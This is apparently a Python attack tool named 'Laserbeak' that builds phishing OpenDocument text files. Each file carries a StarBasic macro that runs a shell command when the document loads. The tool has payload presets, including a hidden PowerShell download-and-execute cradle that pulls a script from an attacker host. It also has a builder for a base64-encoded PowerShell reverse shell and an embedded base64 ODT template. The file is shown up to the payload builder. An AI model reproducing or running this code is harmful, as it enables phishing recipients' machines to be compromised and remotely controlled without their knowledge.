#!/usr/bin/env python3
"""
Laserbeak - Decepticon Infiltration System
ODT Macro Injector | Phishing Document Generator
Part of the Decepticon Recon Suite
"""

import argparse
import base64
import os
import shutil
import subprocess
import sys
import threading
import zipfile
import http.server
import socketserver
import tempfile

DEFAULT_TEMPLATE_B64 = "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"


# ─── Colors ───────────────────────────────────────────────────────────────────
VIOLET = '\033[0;35m'
RED    = '\033[0;31m'
YELLOW = '\033[0;33m'
NC     = '\033[0m'

def v(msg):    print(f"{VIOLET}{msg}{NC}")
def ok(msg):   print(f"{VIOLET} [+] {msg}{NC}")
def err(msg):  print(f"{RED} [!] {msg}{NC}")
def inf(msg):  print(f"{VIOLET} [*] {msg}{NC}")
def warn(msg): print(f"{YELLOW} [?] {msg}{NC}")

# ─── Banner ───────────────────────────────────────────────────────────────────
def banner():
    v("")
    v(r"  _                        _                      _    ")
    v(r" | |    __ _ ___  ___ _ __| |__   ___  __ _  ___| | __")
    v(r" | |   / _` / __|/ _ \ '__| '_ \ / _ \/ _` |/ __| |/ /")
    v(r" | |__| (_| \__ \  __/ |  | |_) |  __/ (_| | (__|   < ")
    v(r" |_____\__,_|___/\___|_|  |_.__/ \___|\__,_|\___|_|\_\\")
    v("          by Starscream — Till all are one            ")
    v("")
    v("        [ Decepticon Infiltration System ]              ")
    v("        [ ODT Macro Injector — Phishing Forge ]         ")
    v("        [ Soundwave's eyes inside enemy lines ]         ")
    v("")

# ─── ODT Templates — structure exacte validée sur target ─────────────────────

# Module1.xml — namespace http://openoffice.org/2000/script (pas urn:oasis)
MACRO_XML = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="Module1" script:language="StarBasic" script:moduleType="normal">REM  *****  BASIC  
Sub AutoOpen()
    Shell &quot;{payload}&quot;
End Sub
</script:module>'''

# script-lb.xml — library index (lb pas lc) dans Basic/Standard/
SCRIPT_LB = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE library:library PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "library.dtd">
<library:library xmlns:library="http://openoffice.org/2000/library" library:name="Standard" library:readonly="false" library:passwordprotected="false">
 <library:element library:name="Module1"/>
</library:library>'''

# script-lc.xml — libraries index dans Basic/ (avec xlink)
SCRIPT_LC = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE library:libraries PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "libraries.dtd">
<library:libraries xmlns:library="http://openoffice.org/2000/library" xmlns:xlink="http://www.w3.org/1999/xlink">
 <library:library library:name="Standard" library:link="false"/>
</library:libraries>'''

# content.xml — event binding format natif LibreOffice (ooo:script + vnd.sun.star.script)
CONTENT_XML = '''<?xml version="1.0" encoding="UTF-8"?>
<office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0"
 xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0"
 xmlns:script="urn:oasis:names:tc:opendocument:xmlns:script:1.0"
 xmlns:dom="http://www.w3.org/2001/xml-events"
 xmlns:xlink="http://www.w3.org/1999/xlink"
 office:version="1.2">
<office:scripts>
 <office:event-listeners>
  <script:event-listener script:language="ooo:script"
   script:event-name="dom:load"
   xlink:href="vnd.sun.star.script:Standard.Module1.AutoOpen?language=Basic&amp;location=document"
   xlink:type="simple"/>
 </office:event-listeners>
</office:scripts>
<office:body><office:text><text:p>{body}</text:p></office:text></office:body>
</office:document-content>'''

STYLES_XML = '''<?xml version="1.0" encoding="UTF-8"?>
<office:document-styles xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" office:version="1.2"/>'''

# manifest.xml — référence Module1.xml et script-lb.xml (pas .xba / script-lc)
MANIFEST_XML = '''<?xml version="1.0" encoding="UTF-8"?>
<manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0">
 <manifest:file-entry manifest:media-type="application/vnd.oasis.opendocument.text" manifest:full-path="/"/>
 <manifest:file-entry manifest:media-type="text/xml" manifest:full-path="content.xml"/>
 <manifest:file-entry manifest:media-type="text/xml" manifest:full-path="styles.xml"/>
 <manifest:file-entry manifest:media-type="text/xml" manifest:full-path="Basic/Standard/Module1.xml"/>
 <manifest:file-entry manifest:media-type="text/xml" manifest:full-path="Basic/Standard/script-lb.xml"/>
 <manifest:file-entry manifest:media-type="text/xml" manifest:full-path="Basic/script-lc.xml"/>
</manifest:manifest>'''

MIMETYPE = "application/vnd.oasis.opendocument.text"

# ─── Payload Presets ──────────────────────────────────────────────────────────
PRESETS = {
    "calc":   "cmd /c calc.exe",
    "whoami": "cmd /c whoami > C:\\Users\\Public\\out.txt",
    "ping":   "cmd /c ping -n 1 {lhost}",
    "iex":    'cmd.exe /C ""powershell.exe -nop -w hidden -ep bypass -c IEX((New-Object Net.WebClient).DownloadString(\'http://{lhost}:{lport_http}/{ps_file}\'))""',
}

# ─── PS reverse shell builder ─────────────────────────────────────────────────
def build_revshell_ps1(lhost: str, lport: str) -> str:
    return (
        f"$c=New-Object Net.Sockets.TCPClient('{lhost}',{lport});"
        f"$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};"
        f"while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
        f"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
        f"$r=(iex $d 2>&1|Out-String);$rb=([text.encoding]::ASCII).GetBytes($r);"
        f"$s.Write($rb,0,$rb.Length);$s.Flush()}};$c.Close()"
    )

# ─── Payload builder ──────────────────────────────────────────────────────────
def build_payload(args) -> str:
    if args.preset:
        p = PRESETS.get(args.preset)
        if not p:
            err(f"Unknown preset '{args.preset}'. Available: {', '.join(PRESETS)}")
            sys.exit(1)
        fmt = {}
        if "{lhost}" in p:
            if not args.lhost:
                err("--lhost required for this preset")
                sys.exit(1)
            fmt["lhost"] = args.lhost
        if "{lport_http}" in p:
            fmt["lport_http"] = getattr(args, 'lport_http', None) or "8383"
        if "{ps_file}" in p:
            fmt["ps_file"] = getattr(args, 'ps_file', None) or "rev.ps1"
        return p.format(**fmt)

    if args.cmd:
        return args.cmd

    if getattr(args, 'ps_payload', None):
        return f"cmd /c powershell -NoP -NonI -W Hidden -e {args.ps_payload}"

    if args.lhost and getattr(args, 'lport', None):
        inf(f"Generating embedded PS reverse shell → {args.lhost}:{args.lport}")
        ps  = build_revshell_ps1(args.lhost, args.lport)
        b64 = base64.b64encode(ps.encode("utf-16-le")).decode()
        return f"cmd /c powershell -NoP -NonI -W Hidden -e {b64}"

    err("No payload specified. Use --preset, --cmd, --lhost/--lport, or -p")
    sys.exit(1)

